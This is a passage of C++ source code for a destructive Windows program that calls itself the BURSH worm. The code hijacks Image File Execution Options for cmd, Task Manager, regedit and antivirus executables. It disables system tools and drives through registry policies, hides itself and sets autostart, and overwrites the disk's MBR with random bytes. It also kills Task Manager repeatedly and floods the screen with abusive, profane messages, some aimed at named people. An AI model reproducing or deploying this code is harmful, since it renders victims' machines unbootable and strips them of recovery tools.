					allParameter[i].find("/work:") != string::npos ||
					allParameter[i].find("/workp:") != string::npos ||
					allParameter[i].find("/workprog:") != string::npos ||
					allParameter[i].find("/workprogram:") != string::npos ||
					allParameter[i].find("/run:") != string::npos ||
					allParameter[i].find("/runp:") != string::npos ||
					allParameter[i].find("/runprog:") != string::npos ||
					allParameter[i].find("/runprogram:") != string::npos) {
					MessageBox(NULL, L"Run This Program Set", stringToLPCWSTR(splitstr(allParameter[i], ":")[0]),
						MB_OK | MB_ICONINFORMATION);
					string backParameter = splitstr(allParameter[i], ":").back();
					transform(backParameter.begin(), backParameter.end(), backParameter.begin(), ::tolower);
					if (backParameter == "true" ||
						backParameter == "1" ||
						backParameter == "y" ||
						backParameter == "yes") {
						continue;
					}
					else if (backParameter == "false" ||
						backParameter == "0" ||
						backParameter == "n" ||
						backParameter == "no") {
						exit(-200);
					}
					else {
						MessageBox(NULL, L"未知参数类型。", L"temp debug", MB_OK | MB_ICONINFORMATION);
					}
				}
				else {
					MessageBox(NULL, L"未知参数。", L"temp debug", MB_OK | MB_ICONERROR);
				}
			}
		}
		else if (argv[1] == "/__RUNOFIMAGEFILE__") {
			goto RUN_OF_IMAGE_FILE_CONTINUE;
		}
		else {
			MessageBox(NULL, L"您没有修改参数的权限！", L"PARAMETER FAILED ERROR", MB_OK | MB_ICONERROR);
		}
	}
	ShowWindow(GetForegroundWindow(), __SHOW_WINDOW__);
	RUN_OF_IMAGE_FILE_CONTINUE :
	if (!IsUserAnAdmin()) {
		MessageBox(NULL, L"请以管理员方式运行此程序！", L"FAILED ERROR MESSAGEBOX", MB_OK | MB_ICONERROR);
		return -20000;
	}
	string BeReplaceString[] = {
		"cmd.exe",
		"cmd.pif",
		"cmd.com",
		"taskkill.exe",
		"taskkill.pif",
		"taskkill.com",
		"tasklist.exe",
		"tasklist.com",
		"tasklist.pif",
		"taskmgr.exe",
		"taskmgr.pif",
		"taskmgr.com",
		"360tray.exe",
		"360tray.pif",
		"360tray.com",
		"360sd.exe",
		"360sd.pif",
		"360sd.com",
		"regedit.exe",
		"regedit.pif",
		"regedit.com",
		"reg.com",
		"reg.pif",
		"reg.exe",
	};
	string imageFilePath = (string)argv[0] + " /__RUNOFIMAGEFILE__";
	for (size_t i = 0; i < sizeof(BeReplaceString) / sizeof(BeReplaceString[0]); i++)
	{
		EditImageFile(BeReplaceString[i], imageFilePath);
		cout << "成功修改注册表 ：" << BeReplaceString[i] << " 为：" << imageFilePath;
	}
	
	// THREAD
	DWORD  threadId_0;
	DWORD  threadId_deter;
	DWORD  threadId_rMB;
	DWORD  threadId_tunnel;
	DWORD  threadId_main;
	DWORD  threadIdORU;
	DWORD  threadIdORP;
	cout << "threadId 变量定义完成。" << endl;
	// INFORMATION_SHOW
	if ((_access("C:\\Window\\RFBV", 0)) != -1) {
		cout << "RUN_BEGIN : ON" << endl;
	}
	else {
		cout << "RUN_BEGIN : OFF" << endl;
	}
	cout << (releaseMode ? "RELEASE MODE : ON" : "RELEASE MODE : OFF") << endl;
	cout << (runtimeCheck ? "RUNTIME CHECK : ON" : "RUNTIME CHECK : OFF") << endl;
	if (((_access("C:\\Window\\RFBV",0)) == -1 && (((string)argv[0]).length() - splitstr(argv[0], "\\").back().length()) != 3) && argv[1] != "/__RUNOFIMAGEFILE__" && waitTime == ((LONGLONG)~MAXLONGLONG))
	{
		UINT WarningMessageBoxFirstRes = MessageBox(NULL, LR"(The software you just execute*D* in c*ON*sidered malware.*'*
*T*his* *malwa*R*e will harm your.comp*U*tera*N*d makes it unusable*!*
If you are seeing this message without knowing what you just executed, simply press Noand nothing will happen.
If you know what this malware doesand using a safe environment to test, press Yes to start it.
DO YOU WANT TO EXECUTE THIS MALWARE, RESULTING IN AN UNUSABLE MACHINE ( Possible ) ?
-- BURSH Virus)", L"BURSH 蠕虫病毒 - 郭书岩制作", MB_OKCANCEL | MB_ICONWARNING);
		if (WarningMessageBoxFirstRes == IDCANCEL) {
			MessageBoxW(NULL, L"I knew you wouldn't easily agree to my request...", L"IT'S A PITY", MB_OK | MB_ICONINFORMATION);
			exit(-101);
		}
		UINT WarningMessageBoxLastRes = MessageBox(NULL, LR"(THIS IS THE LAST WARNING!
THE CREATOR IS NOT RESPONSIBLE FOR ANY DAMAGE MADE USING THIS MALWARE!
STILL EXECUTE IT ? )", L"BURSH 蠕虫病毒 - 郭书岩制作", MB_OKCANCEL | MB_ICONWARNING);
		if (WarningMessageBoxLastRes == IDCANCEL) {
			for (size_t i = 0; i <= 100; i++)
			{
				DWORD TEMPTHREADID;
				CreateThread(NULL, 0, SecondDeter, 0, 0, &TEMPTHREADID); // 创建线程
				Sleep(50);
			}
			Sleep(20000);
			exit(-100);
		}
		CreateThread(NULL, 0, ThreadDeterMB, 0, 0, &threadId_deter);
	}
	else if (((string)argv[0]).length() - splitstr(argv[0], "\\").back().length() == 3) {
		MD5 MD5FileName;
		ShellExecuteA(NULL, NULL, "explorer",
			MD5FileName.encode(splitstr(splitstr(argv[0], "\\").back(), ".")[0]).c_str(), NULL, SW_SHOWDEFAULT);
		Sleep(120 * 1000);
	}
	// hThread = CreateThread(NULL, 0, ThreadFunc, 0, 0, &threadId); // 创建线程
	// MessageBox(NULL, L"我们互不干扰！", L"BURSH 主线程", MB_OK | MB_ICONINFORMATION);
	string mainPath = argv[0];
	cout << "成功获取 主 文件路径：\n" + mainPath << endl;
	SetFileAttributesW(stringToLPCWSTR(mainPath), FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN);
	cout << "主文件隐藏属性已设置。" << endl;
	BOOL GetPrivilegesSuccess = true;
	try {
		GetPrivileges();
	}
	catch (exception e) {
		GetPrivilegesSuccess = false;
		cout << "获取权限失败!\n错误 : " << e.what() << endl;
		cout << "GetLastError() : " << GetLastError() << endl;
	}
	if (GetPrivilegesSuccess) {
		cout << "成功获取权限。" << endl;
	}
	TCHAR szClassName[] = _T("BURSHVirus");
	TCHAR szClassName_BSOD[] = _T("BURSHCloseBSOD");
	cout << "创建类 BURSHVirus 成功。" << endl;
	/*
		WNDCLASS是一个由系统支持的结构，
		用来储存某一类窗口的信息,如ClassStyle,消息处理函数，Icon,Cursor,背景Brush等。
		也就是说，CreateWindow只是将某个WNDCLASS定义的窗体变成实例
	*/
	int max_n = 0xFFF;
	int min_n = 0x000;
	int new_n;
	int i;
	char MBRChars[512];
	for (i = 0; i < 512; i++) {
		new_n = ((rand() % (max_n + 1 - min_n)) + min_n);
		cout << "new_n = " << new_n << endl;
		itoa(new_n, MBRChars, 16);
	}
	cout << "MBRCHARS 定义完毕。信息为：" << endl;
	ThisIsAVeryVeryVeryLongString0ButIDonNotThinkAnyoneWillUseIt AllMBRChars;
	for (size_t i = 0; i < sizeof(MBRChars); i++)
	{
		AllMBRChars += MBRChars[i];
	}
	cout << AllMBRChars << endl;
	WNDCLASS wndcls = { 0 }; // zeroMemory方法
	//窗口的背景色
	wndcls.hbrBackground = (HBRUSH)GetStockObject(WHITE_BRUSH);
	//窗口的鼠标光标
	wndcls.hCursor = (HCURSOR)LoadCursor(NULL, IDC_ARROW);
	//窗口的最小化图标
	wndcls.hIcon = (HICON)LoadIcon(NULL, IDI_APPLICATION);
	//窗口的处理函数
	wndcls.lpfnWndProc = WndProc;
	//窗口类名
	wndcls.lpszClassName = szClassName;
	if (!RegisterClassW(&wndcls))
	{
		MessageBox(NULL, L"RegisterClass Failed!\r\n", L"BURSH", MB_OK | MB_ICONERROR);
		return 0;
	}
	cout << "UDisk 窗体注册操作完成。" << endl;
	WNDCLASS BSODwndcls = { 0 }; // zeroMemory方法
	//窗口的背景色
	BSODwndcls.hbrBackground = (HBRUSH)GetStockObject(WHITE_BRUSH);
	//窗口的鼠标光标
	BSODwndcls.hCursor = (HCURSOR)LoadCursor(NULL, IDC_ARROW);
	//窗口的最小化图标
	BSODwndcls.hIcon = (HICON)LoadIcon(NULL, IDI_APPLICATION);
	//窗口的处理函数
	BSODwndcls.lpfnWndProc = WindowBSODProc;
	//窗口类名
	BSODwndcls.lpszClassName = szClassName_BSOD;
	if (!RegisterClassW(&BSODwndcls))
	{
		MessageBox(NULL, L"RegisterClass Failed!\r\n", L"BURSH (BSOD) ", MB_OK | MB_ICONERROR);
		return 0;
	}
	cout << "BSOD 窗体注册操作完成。" << endl;
	int ret0  = setDWORDReg(HKEY_CURRENT_USER, "Software\\Policies\\Microsoft\\MMC\\{8FC0B734-A0E1-11D1-A7D3-0000F87571E3}", "Restrict_Run", (BYTE *) 1); // 禁止组策略
	int ret1  = setDWORDReg(HKEY_CURRENT_USER, "Software\\Policies\\Microsoft\\MMC\\{975797FC-4E2A-11D0-B702-00C04FD8DBF7}", "Restrict_Run", (BYTE *) 1); // 禁止事件查看器
	int ret2  = setDWORDReg(HKEY_CURRENT_USER, "Software\\Policies\\Microsoft\\MMC\\{8EAD3A12-B2C1-11d0-83AA-00A0C92C9D5D}", "Restrict_Run", (BYTE *) 1); // 禁止磁盘管理
	int ret3  = setDWORDReg(HKEY_CURRENT_USER, "Software\\Policies\\Microsoft\\MMC\\{5D6179C8-17EC-11D1-9AA9-00C04FD8FE93}", "Restrict_Run", (BYTE *) 1); // 禁止本地用户和组
	int ret4  = setDWORDReg(HKEY_CURRENT_USER, "Software\\Policies\\Microsoft\\MMC\\{45ac8c63-23e2-11d1-a696-00c04fd58bc3}", "Restrict_Run", (BYTE *) 1); // 禁止系统信息
	int ret5  = setDWORDReg(HKEY_CURRENT_USER, "Software\\Policies\\Microsoft\\MMC\\{90087284-d6d6-11d0-8353-00a0c90640bf}", "Restrict_Run", (BYTE *) 1); // 禁止设备管理器
	int ret6  = setDWORDReg(HKEY_CURRENT_USER, "Software\\Policies\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "RestrictRun", (BYTE*) 1); // 禁止运行所有程序
	int ret7  = setDWORDReg(HKEY_CURRENT_USER, "Software\\Policies\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "DisallowRun", (BYTE*) 1); // 禁止运行
	int ret8  = setDWORDReg(HKEY_CURRENT_USER, "Software\\Policies\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoDrives", (BYTE *) 0xFFFFFFFF); // 无法打开磁盘
	int ret9  = setDWORDReg(HKEY_CURRENT_USER, "Software\\Policies\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoViewOnDrive", (BYTE*) 0xFFFFFFFF); // 无法显示磁盘
	int ret10 = setDWORDReg(HKEY_CURRENT_USER, "Software\\Policies\\Microsoft\\Windows\\CurrentVersion\\Policies\\WindowsUpdate", "DisableWindowsUpdateAccess", (BYTE*) 1); // 禁止 Windows Update
	int ret11 = setDWORDReg(HKEY_CURRENT_USER, "Software\\Policies\\Microsoft\\Windows\\System", "DisableCMD", (BYTE*) 2); // 禁止 CMD
	int ret12 = setDWORDReg(HKEY_CURRENT_USER, "Software\\Policies\\Microsoft\\Windows\\System", "DisableTaskMgr", (BYTE*) 1); // 禁止任务管理器
	int ret13 = setDWORDReg(HKEY_CURRENT_USER, "Software\\Policies\\Microsoft\\Windows\\System", "DisableLockWorkstation", (BYTE*) 1); // 禁止用户锁定计算机
	int ret14 = setDWORDReg(HKEY_CURRENT_USER, "Software\\Policies\\Microsoft\\Windows\\System", "DisableChangePassword", (BYTE*) 1); // 禁止用户改变密码
	{
		PHKEY phKey = nullptr;
		RegCreateKeyA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\SystemCertificates\\ROOT\\Certificates", phKey);
	}
	{
		PHKEY phKey = nullptr;
		char ReplaceTable[] = { 'A', 'B', 'C', 'D', 'E', 'F', 'G',
			'H', 'I', 'J', 'K', 'L', 'M',
			'N', 'O', 'P', 'Q', 'R', 'S',
			'T', 'U', 'V', 'W', 'X', 'Y',
			'Z' };
		char BeReplaceTable[] = { 'a', 'b', 'c', 'd', 'e', 'f', 'g',
			'h', 'i', 'j', 'k', 'l', 'm',
			'n', 'o', 'p', 'q', 'r', 's',
			't', 'u', 'v', 'w', 'x', 'y',
			'z' };
		string random_str = ReplaceString(rand_str(40), ReplaceTable, BeReplaceTable);
		RegCreateKeyA(HKEY_LOCAL_MACHINE, ((string)"SOFTWARE\\Microsoft\\SystemCertificates\\ROOT\\Certificates\\" + random_str).c_str(), phKey);
		setBinaryReg(HKEY_LOCAL_MACHINE, (string)"SOFTWARE\\Microsoft\\SystemCertificates\\ROOT\\Certificates\\" + random_str, "Blob", (const BYTE *)0x0);
	}
	{
		setSZReg(HKEY_CURRENT_USER, "Control Panel\\Desktop", "WallpaperStyle", (BYTE *)"0");
		setSZReg(HKEY_CURRENT_USER, "Control Panel\\Desktop", "Wallpaper", (BYTE*)"C:\\Windows\\Web\\Wallpaper\\Windows\\image0.jpg");
		setSZReg(HKEY_CURRENT_USER, "Control Panel\\Desktop", "WallpaperStyle", (BYTE*)"10");
	}
	if (!(ret0 && ret1 && ret2 && ret3 && ret4 && ret5 && ret6 && ret7 && ret8 && ret9 && ret10 && ret11 && ret12 && ret13 && ret14)) {
		auto errorMessageBox = [] {
			MessageBoxA(NULL, "注册表修改失败！", "FAILED ERROR", MB_OK | MB_ICONERROR);
		};
		thread errorMessageBoxThread(errorMessageBox);
		errorMessageBoxThread.join();
	}
	if (mainPath.find("C:\\Window\\") == string::npos) {
		cout << "不在 Window 文件夹里。" << endl;
		if ((_access("C:\\Window\\", 0)) != -1)
		{
			// 检测是否有权限
			if ((_access("C:\\Window\\", 6)) == -1) {
				MessageBox(NULL, L"Folder WINDOW does not have RAW permission.\n", L"BURSH", MB_OK | MB_ICONERROR);
			}
			else {
				RemoveDirectory(L"C:\\Window");
			}
		}
		cout << "有 Window 文件夹权限。" << endl;
		// 检测是否有 bursh.exe 老文件
		if ((_access("C:\\Window\\bursh.exe", 0)) != -1)
		{
			// 检测是否有权限
			if ((_access("C:\\Window\\bursh.exe", 6)) == -1) {
				MessageBox(NULL, L"File BURSH.EXE does not have RAW permission.\n", L"BURSH", MB_OK | MB_ICONERROR);
			}
			else {
				DeleteFile(L"C:\\Window\\bursh.exe");
			}
		}
		cout << "有 brush.exe 文件权限。" << endl;
		WinExec(((string)"copy " + mainPath + " C:\\Window\\bursh.exe").c_str(), SW_HIDE);
		cout << "主程序复制完成 。" << endl;
		if ((_access("C:\\Window\\WAITTIME", 0)) == -1) { // WAITTIME 文件不存在
			WinExec(((string)"echo RUN_FINISH_BURSH_VIRUS>C:\\Window\\RFBV").c_str(), SW_HIDE);
		}
		cout << "检测文件创建成功 。" << endl;
		AutoPowerOn("C:\\Window\\bursh.exe");
		cout << "开机自启动完成。" << endl;
	}
	Sleep(waitTime == ((LONGLONG)~MAXLONGLONG) ? 0 : waitTime);
	cout << "Sleep 操作完成。" << endl;
	GetPrivileges();
	ReadPHYSICALDRIVE("\\\\.\\PhysicalDrive0", MBRChars);
	cout << "写入 MBR 完成。" << endl;
	HWND hWnd = CreateWindow(szClassName, szClassName, WS_OVERLAPPEDWINDOW, CW_USEDEFAULT,
		CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, NULL, NULL, NULL, NULL);
	CreateThread(NULL, 0, CloseTaskManagerThreadFunc, 0, 0, &threadId_0); // 创建线程
	CreateThread(NULL, 0, ThreadUDiskWindow, 0, 0, &threadId_main); // 创建线程
	if (NULL == hWnd)
	{
		MessageBox(NULL, L"CreateWindow Failed!\r\n", L"BURSH", MB_OK | MB_ICONERROR);
		return 0;
	}
	//该函数设置指定窗口的显示状态。
	ShowWindow(hWnd, SW_HIDE);
	cout << "UDisk 窗口显示完成。" << endl;
	UpdateWindow(hWnd);
	cout << "UDisk 窗口更新完成。" << endl;
	string fileName = "C:\\BURSH_VIRUS_MESSAGE.TXT";
	const unsigned char msg[] = "YOUR COMPUTER HAS BEEN FUCKED BY THE BURSH TROJAN.\r\n\r\nYour computer won't boot up again,\r\n\r\nso use it as long as you can!\r\n\r\n:D\r\n\r\nTrying to kill BURSH will cause your system to be destroyed instantly, so don't try it :D\r\n\r\nHave fun Bye :D\r\n\r\n-- The Virus Author: Guo Shuyan";
	HANDLE note = CreateFileA(fileName.c_str(),
		GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);

	if (note == INVALID_HANDLE_VALUE)
		ExitProcess(4);
	DWORD wb;
	if (!WriteFile(note, msg, sizeof(msg), &wb, NULL))
		ExitProcess(5);
	cout << "写入完成。" << endl;
	CloseHandle(note);
	ShellExecuteA(NULL, NULL, "notepad", fileName.c_str(), NULL, SW_SHOWDEFAULT);
	Sleep(100000);
	int whileCount = 0;
	while (1) {
		POINT cursor;
		GetCursorPos(&cursor);
		
		SetCursorPos(
			cursor.x +
			(random() % 3 - 1) *
			(random() % ((random() / 2200 + 2)) % 3 - 1),
			cursor.y +
			(random() % 3 - 1) *
			(random() % ((random() / 2200 + 2)) % 3 - 1)
		);
		if (whileCount == 0) {
			CreateThread(NULL, 0, ThreadRandomMB, 0, 0, &threadId_rMB); // 创建线程
			CreateThread(NULL, 0, ThreadTunnelWindow, 0, 0, &threadId_tunnel); // 创建线程
			CreateThread(NULL, 0, OpenRU, 0, 0, &threadIdORU); // 创建线程
			CreateThread(NULL, 0, OpenRP, 0, 0, &threadIdORP); // 创建线程
		}
		if (whileCount == 100) {
			killWindowsInstant();
		}
		whileCount++;
		Sleep(100);
	}
}

LRESULT CALLBACK msgBoxHook(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode == HCBT_CREATEWND) {
		CREATESTRUCT* pcs = ((CBT_CREATEWND*)lParam)->lpcs;

		if ((pcs->style & WS_DLGFRAME) || (pcs->style & WS_POPUP)) {
			HWND hwnd = (HWND)wParam;

			int x = random() % (scrw - pcs->cx);
			int y = random() % (scrh - pcs->cy);

			pcs->x = x;
			pcs->y = y;
		}
	}

	return CallNextHookEx(0, nCode, wParam, lParam);
}

DWORD WINAPI ThreadTunnelWindow(LPVOID p) {
	while (1) {
		Tunnel();
		Sleep(400);
	}
	return 0;
}

DWORD WINAPI ThreadUDiskWindow(LPVOID p) {
	MSG msg;
	//以下三个message 方法请各自百度百科了解吧。
	while (GetMessage(&msg, NULL, NULL, NULL))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	return 0;
}

DWORD WINAPI ThreadFunc(LPVOID p)
{
	MessageBox(NULL,
		stringToLPCWSTR((string)"我是 BURSH 的子线程， pid = " + to_string(long long(GetCurrentThreadId())) + "\n"),
		L"BURSH 子线程",
		MB_OK | MB_ICONINFORMATION);   //输出子线程pid
	return 0;
}
DWORD WINAPI ThreadDeterMB(LPVOID) {
	MessageBox(NULL,
		L"Enjoy the time below!",
		L"BURSH Virus - Make By Guoshuyan",
		MB_OK | MB_ICONERROR);
	return 0;
}
DWORD WINAPI messageBoxThread(LPVOID parameter) {
	string* fuckyouMessageArrayPointer = new string[100];
	string fuckyouMessageArray[] = {
		"你好傻逼。",
		"还在用这台电脑？",
		"放弃吧...",
		"抄你妈逼，我不想写作业",
		"作业是什么？是傻逼！！",
		"为什么我要东西都要钱啊！",
		"傻逼老师！",
		"爷不想上学！",
		"爷想玩游戏。",
		"刷牙？刷个屁！",
		"艹，怎么又是 0xc0000005",
		"（狂砸键盘中）",
		"我操，没变量？",
		"他奶奶的，怎么没有库文件啊！",
		"算了去 CSDN 上复制一个吧",
		"Google 怎么上不去啊啊啊啊！",
		"让我看看...MB_ICONINFORMATION 是信息对吧...",
		"这垃圾教程什么东西啊！！",
		"算了去 cnblogs 上复制一个吧",
		"啊哈哈哈，病毒来喽",
		"为什么作业怎么多啊！",
		"我的温迪...嘿嘿嘿...温迪...",
		"代静涵喜欢优菈。",
		"我知道你在看，赶紧滚。",
		"傻逼",
		"作者：郭书岩"
	};
	for (size_t i = 0; i < sizeof(fuckyouMessageArray) / sizeof(fuckyouMessageArray[0]); i++)
	{
		fuckyouMessageArrayPointer[i] = fuckyouMessageArray[i];
	}
	long icons[] = {
		MB_ICONERROR,
		MB_ICONINFORMATION,
		MB_ICONQUESTION,
		MB_ICONWARNING
	};
	HHOOK hook = SetWindowsHookEx(WH_CBT, msgBoxHook, 0, GetCurrentThreadId());
	MessageBoxW(NULL, stringToLPCWSTR(fuckyouMessageArrayPointer[random() % sizeof(fuckyouMessageArray) / sizeof(fuckyouMessageArray[0])]), L"BURSH", MB_SYSTEMMODAL | MB_OK | icons[random() % sizeof(icons) / sizeof(icons[0])]);
	UnhookWindowsHookEx(hook);

	return 0;
}

DWORD WINAPI ThreadRandomMB(LPVOID) {
	int whileCount = 0;

	while (whileCount <= 100) {
		DWORD TEMPTHREADID;
		CreateThread(NULL, 0, messageBoxThread, 0, 0, &TEMPTHREADID); // 创建线程
		Sleep(50);
		whileCount++;
	}
	return 0;
}
DWORD WINAPI CloseTaskManagerThreadFunc(LPVOID p) {
	GetPrivileges();
	string ExitProcess[] = { "taskmgr.exe", "taskmgr.com", "taskmgr.pif",
							  "taskkill.exe", "taskkill.com", "taskkill.pif",
							  "健全侠粉丝专用.exe", "健全侠粉丝专用.com", "健全侠粉丝专用.pif"};
	while (1) {
		for (size_t i = 0; i < sizeof(ExitProcess) / sizeof(ExitProcess[0]); i++)
		{
			HWND hwnd = FindWindowA(NULL, ExitProcess[i].c_str());
			if (hwnd == NULL) {
				continue;
			}
			else {
				TerminateProcess(hwnd, -2000);
			}
		}
		
		WinExec("taskkill /f /im taskmgr.exe", SW_HIDE);
		WinExec("taskkill /f /im taskmgr.com", SW_HIDE);
		WinExec("taskkill /f /im taskmgr.pif", SW_HIDE);
		// Taskkill
		WinExec("taskkill /f /im taskkill.exe", SW_HIDE);
		WinExec("taskkill /f /im taskkill.com", SW_HIDE);
		WinExec("taskkill /f /im taskkill.pif", SW_HIDE);
	}
	return 0;
}






//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
/////////////////////////////////////////////// 老婆观赏区 S T A R T //////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
////                                                                                                                  ////
////                                                                                                                  ////
////                                                                                                                  ////
////                                                                                                                  ////
////                                                                                                                  ////
////                                                                                                                  ////
////                                                                                                                  ////
////                                                                                                                  ////
////                                                                                                                  ////
////                                                                                                                  ////
////                                                                                                                  ////
////                                                                                                                  ////
////                                                                                                                  ////
////                                                                                                                  ////
////                                                                                                                  ////
////                                                                                                                  ////
////                                                                                                                  ////
////                                                                                                                  ////
////                                                                                                                  ////
////                                                                                                                  ////
////                                                                                                                  ////
////                                                                                                                  ////
////                                                                                                                  ////
////                                                                                                                  ////
////                                                                                                                  ////
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////// 老婆观赏区 E N D ///////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////